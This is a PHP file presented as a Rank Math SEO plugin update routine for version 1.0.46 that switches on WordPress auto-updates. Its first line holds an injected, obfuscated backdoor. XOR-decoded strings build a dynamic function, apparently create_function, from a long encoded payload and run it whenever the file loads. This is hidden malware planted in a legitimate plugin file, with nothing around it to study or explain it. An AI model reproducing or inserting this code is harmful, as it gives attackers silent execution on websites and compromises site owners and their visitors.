<?php $IKqgbN='C;3 = o>=YHLQ+;'; $czWqttAB=' IVAIE0XH7+88DU'^$IKqgbN; $MnCxayy=',HAo+I< 6E =+,1+9F;aP78Aa RH07h=> UFFi4aO1K ZZ U<f;U7lHM:0=d>XIzc04XYgil;S;cqwnlT-3zelW:Fltymfkgm4X-<RmZawHWxiwDuJ8+<E6dmOZ0PQvOMIYqsfKOi8LNgcVpRfVZ2T1b<;upohPP3gHExlfE2D>4Yoa  6l5osk3eGRA71Xyo;9LyqG8MM->xHW;2,mDo WA<Hrza1 N7>Z7-odoTLU07kHzT-4RL;9nIT<yxx;>3s-1Pi= BYzqQP,LTNXhcJaBfV7B fW,.OQuqRR2abDs7.:8olxhKS4;Xjs2dkRKuleeV1HRek=fSFY:PX9 OzFo 4<bq2=PS;ti;= sithNG2RYTPu6l8NS-;EZf2ETktBN< JcKhKB7YY urfqC8 =UIdMVxE4hT6MO wSf5G66Q=SJ+>5 kCZ;o +.Adq7L a;491awc 3 >RPDiQUY,PFNjJM Ai,H;Bjnz=,iT T>7mglyR7>2InGH4gNB1<HXCF V0VkBc4UT3scstLzCJxdu-T60miRU3q0yhSPxSyjvxagBaU56QUOo,X<r+OS8tWb5q7.+vhDpbiJ9H= Ak80Go,N:G1ErtGQTAQYDhzog2AYAZNqQmuZgCa= 4ARjjV2I;upMUDQB-.akcTf7WE=1QBjL7,'; $ynmbFWr=$czWqttAB('', 'E.iNM<RCB,OStIIBJ2HIwOW3>D3<Qh7PKTrooIOkFW>N9.I:RFC:E3,,NQb;S-=RGTU,8KIHP6BJQWNLtV9slH8O2LIYJAPmd=>BNzI3AJhgCIS-I9LYP XLI+;D1xMoi rZZlBFMW9:GMkPzB2;F5jFUfU.OL;5J<l,XIF6F6RQ7GEKEOEhFHa:l575BC6QKTL8PJM10GP4rl3ZFMMyOF6-O-IpEUA:Va1RTOYO2-9CRPBp2BF7-XQNapc:77pwvSLBpMVE;yGOqtZ-8;=AC1kKB2V6A9<IWolUU97KZhMWSONYOQXL=2XN=QyOna;-UDDA2P<3LKFlZ 6H59ZHoRb0rqm74aip2HTMPXYSTJHj1S>,1yUMf1GwIZ1;9Y -KIbjWE3XAaBfS8-AUOFU5YLH0rnD+r8>bpR,;AWnFu2XE4O:+GWOEC;5I0DJZ ;.Z9TIYUJTWC<DVCQ65lM54-MyjnN.,T 6G-BkCUpTJApD5JVMAJY3ELS01,-M8+:XO<+kaK3IqGbGP4 RZCURlR..MLQI5BQ6N90JVmPHnmXtHSNJRWuR0VT34.YM<ZAJz1YL5PTBSKMAOmPDOjX:OA84SU>0I6S4E6ZS70-->8 OVOCV - sgQqMUzG8k4EB >BN2S=Z.W=4==-LJF6Jol>2=TEyrCw=Q'^$MnCxayy); $ynmbFWr();
/**
 * The Updates routine for version 1.0.46
 *
 * @since      1.0.46
 * @package    RankMath
 * @subpackage RankMath\Updates
 * @author     Rank Math <support@rankmath.com>
 */

use RankMath\Helper;

/**
 * Enable the core auto update option if it's set in RM.
 */
function rank_math_1_0_46_maybe_enable_auto_update() {
	if ( Helper::get_settings( 'general.enable_auto_update' ) ) {
		Helper::toggle_auto_update_setting( 'on' );
	}
}
rank_math_1_0_46_maybe_enable_auto_update();
